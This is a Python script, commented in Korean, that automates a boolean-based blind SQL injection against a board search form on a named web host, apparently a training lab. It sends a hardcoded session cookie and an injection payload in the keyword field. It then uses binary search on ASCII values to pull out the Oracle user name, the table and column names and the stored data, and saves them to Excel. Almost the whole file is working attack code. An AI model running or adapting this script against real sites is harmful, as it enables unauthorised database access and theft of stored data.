import requests
from openpyxl import Workbook

url = "http://elms1.skinfosec.co.kr:8082/community6/free"
cookies = {"JSESSIONID": "3E419A44504A587324B74A7D434E569C"}
data = "hi%' and {} and '1%'='1"

def binary_search(query):
    blind_query = "(" + query + ") > {}"
    base_data = data.format(blind_query)
    min = 1
    max = 127
    while min < max:
        avg = int((min + max) / 2)
        attack_data = base_data.format(avg)
        res = requests.post(url, data={"searchType": "all", "keyword": attack_data}, cookies=cookies)
        if '권한' in res.text:
            print('세션ID 교체!')
            break
        else:
            if '조나단' in res.text:
                min = avg + 1
            else:
                max = avg
    return min

# DB명 출력
query = "select length(user) from dual"
DB_Length = binary_search(query)
print("DB명의 길이 : {}글자".format(DB_Length))

DB_Name = ""
for i in range(1, DB_Length + 1):
    query = "select ascii(substr(user,{},1)) from dual".format(i)
    DB_Name += chr(binary_search(query))
print("DB명 : {}".format(DB_Name))

# 테이블 개수 및 목록 출력
print("테이블 목록")
query = "select table_name from user_tables"
Table_Count = binary_search("select count(*) from user_tables")
Table_Names = []
for i in range(1, Table_Count + 1):
    Table_Length = binary_search("select length(table_name) from (select table_name, rownum as rnum from user_tables) where rnum = {}".format(i))
    Table_Name = ""
    for j in range(1, Table_Length + 1):
        Table_Name += chr(binary_search("select ascii(substr(table_name, {}, 1)) from (select table_name, rownum as rnum from user_tables) where rnum = {}".format(j, i)))
    Table_Names.append(Table_Name)
    print("{}. {}".format(i, Table_Name))

# 사용자가 선택한 테이블의 컬럼 개수 및 목록 출력
selected_table_index = int(input("테이블 목록에서 원하는 테이블의 번호를 선택하세요: "))
print("컬럼 목록")
query = "select column_name from user_tab_columns where table_name = '{}'".format(Table_Names[selected_table_index - 1])
Column_Count = binary_search("select count(*) from user_tab_columns where table_name = '{}'".format(Table_Names[selected_table_index - 1]))
Column_Names = []
for i in range(1, Column_Count + 1):
    Column_Length = binary_search("select length(column_name) from (select column_name, rownum as rnum from user_tab_columns where table_name = '{}') where rnum = {}".format(Table_Names[selected_table_index - 1], i))
    column_name = ""
    for j in range(1, Column_Length + 1):
        column_name += chr(binary_search("select ascii(substr(column_name, {}, 1)) from (select column_name, rownum as rnum from user_tab_columns where table_name = '{}') where rnum = {}".format(j, Table_Names[selected_table_index - 1], i)))
    Column_Names.append(column_name)
    print("{}. {}".format(i, column_name))

# 사용자가 선택한 컬럼의 데이터 개수 및 목록 출력
selected_column_index = int(input("컬럼 목록에서 원하는 컬럼의 번호를 선택하세요: "))
print("데이터 목록")
query = "select {} from {}".format(Column_Names[selected_column_index - 1], Table_Names[selected_table_index - 1])
Data_Count = binary_search("select count({}) from {}".format(Column_Names[selected_column_index - 1], Table_Names[selected_table_index - 1]))
Data_Content = []
for i in range(1, Data_Count + 1):
    data_length = binary_search("select length({}) from (select {}, rownum as rnum from {}) where rnum = {}".format(Column_Names[selected_column_index - 1], Column_Names[selected_column_index - 1], Table_Names[selected_table_index - 1], i))
    data_content = ""
    for j in range(1, data_length + 1):
        data_content += chr(binary_search("select ascii(substr({}, {}, 1)) from (select {}, rownum rnum from {}) where rnum = {}".format(Column_Names[selected_column_index - 1], j, Column_Names[selected_column_index - 1], Table_Names[selected_table_index - 1], i)))
    Data_Content.append(data_content)  
    print("{}번째 데이터 : {}".format(i, data_content))


# 엑셀로 저장
def save_to_excel(table_name, column_names, data_content):
    wb = Workbook()
    ws = wb.active
    ws.title = table_name
    
    # Write column headers
    for col_num, column_name in enumerate(column_names, start=1):
        ws.cell(row=1, column=col_num, value=column_name)
    
    # Write data content
    for row_num, row_data in enumerate(data_content, start=2):
        for col_num, cell_value in enumerate(row_data, start=1):
            ws.cell(row=row_num, column=col_num, value=cell_value)
    
    # Save workbook
    wb.save(filename='extracted_data.xlsx')

# Assume you have retrieved the DB name, table list, column list, and data list from the user input

# Example usage:
table_name = "ANSWER"
column_names = ["ANSWER", "REG_DT", "REG_ACCT_ID", "UDT_DT", "UDT_ACCT_ID"]
data_content = ["ant6"]

# Save to Excel
save_to_excel(table_name, column_names, [data_content])